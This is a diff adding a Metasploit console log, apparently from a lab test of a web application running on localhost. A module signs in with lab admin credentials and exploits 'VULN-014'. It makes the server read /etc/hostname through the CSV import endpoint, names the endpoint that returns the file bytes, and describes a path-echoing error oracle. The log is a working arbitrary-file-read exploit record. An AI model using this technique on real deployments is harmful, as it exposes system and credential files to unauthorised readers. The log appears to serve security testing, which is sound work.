@@ -1,0 +1,19 @@
+Loaded 1 modules:
+    1 auxiliary modules
+RHOSTS => 127.0.0.1
+RPORT => 39649
+TARGETURI => /api/v1/downloadPublicImportFile
+SSL => false
+VERBOSE => true
+USERNAME => admin
+PASSWORD => Bspdr-Lab-Adm1n!
+FILEPATH => /etc/hostname
+[*] Running module against 127.0.0.1
+[*] 127.0.0.1:39649 - Signed in as admin (user id 6b047a33e7422a44df31cab8)
+[+] 127.0.0.1:39649 - VULN-014: exploited
+[+] 127.0.0.1:39649 - server read '/etc/hostname' into the csv importer
+[*]   control '/etc/bs-no-such-file' -> error-import-file-missing (the oracle echoes the path)
+[*]   the bytes are retrievable with GET /api/v1/getImportFileData
+[+] 127.0.0.1:39649 - Saved the response to /tmp/.msf4/loot/20261124202753_default_127.0.0.1_blue_spider.vuln_636059.txt
+[*] Auxiliary module execution completed
+whoami: cannot find name for user ID 997
